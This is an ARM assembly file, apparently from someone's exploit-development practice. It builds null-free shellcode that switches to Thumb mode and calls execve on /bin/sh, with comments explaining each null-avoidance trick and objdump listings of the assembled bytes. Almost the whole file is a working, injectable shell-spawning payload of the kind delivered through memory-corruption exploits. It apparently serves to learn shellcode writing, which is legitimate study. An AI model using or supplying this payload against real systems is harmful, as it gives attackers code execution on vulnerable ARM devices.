.section .text
.global _start

_start:
    .code 32                    @ 32-bit mode
    add     r3, pc, #1          @ r3 = pc + 1 to force thumb mode (2 byte instructions)
    bx      r3                  @ since bit 0 is set, branch executed in thumb mode
                                @ bx is a branch and change mode (ARM or Thumb)
                            
    .code 16                    @ Thumb mode
    add     r0, pc, #8          @ operand must be 4 bytes aligned
    eor     r1, r1, r1          @ zero out r1 (NULL command line arguments)
    eor     r2, r2, r2          @ zero out r2 (NULL environment)
    @ store byte into register, r0 = r2 offset by 7 (i.e. 111b), r2 contains a null, so it is used instead of a zero.  This will remove the second to the last null byte from the /bin/sh\0 command string
    strb    r2, [r0, #7]
    mov     r7, #11             @ Execve syscall
    svc     #1                  @ 1 instead of 0 for thumb mode
    
.ascii "/bin/shx"               @ the x is a don't care, it will be overwritten by the 7 from the strb instruction.

/*[mark@infineon Nulls_stripped]$ more objdump_of_dot_o.txt 

shellcode_NULLs_stripped.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:	e28f3001 	add	r3, pc, #1
   4:	e12fff13 	bx	r3
   8:	a002      	add	r0, pc, #8	; (adr r0, 14 <_start+0x14>)
   a:	4049      	eors	r1, r1
   c:	4052      	eors	r2, r2
   e:	71c2      	strb	r2, [r0, #7]
  10:	270b      	movs	r7, #11
  12:	df01      	svc	1
  14:	6e69622f 	.word	0x6e69622f
  18:	7868732f 	.word	0x7868732f
[mark@infineon Nulls_stripped]$ */

/*[mark@infineon Nulls_stripped]$ more objdump_of_dot_exe.txt 

shellcode_NULLs_stripped:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:	e28f3001 	add	r3, pc, #1
   10058:	e12fff13 	bx	r3
   1005c:	a002      	add	r0, pc, #8	; (adr r0, 10068 <_start
+0x14>)
   1005e:	4049      	eors	r1, r1
   10060:	4052      	eors	r2, r2
   10062:	71c2      	strb	r2, [r0, #7]
   10064:	270b      	movs	r7, #11
   10066:	df01      	svc	1
   10068:	6e69622f 	.word	0x6e69622f
   1006c:	7868732f 	.word	0x7868732f
[mark@infineon Nulls_stripped]$ */
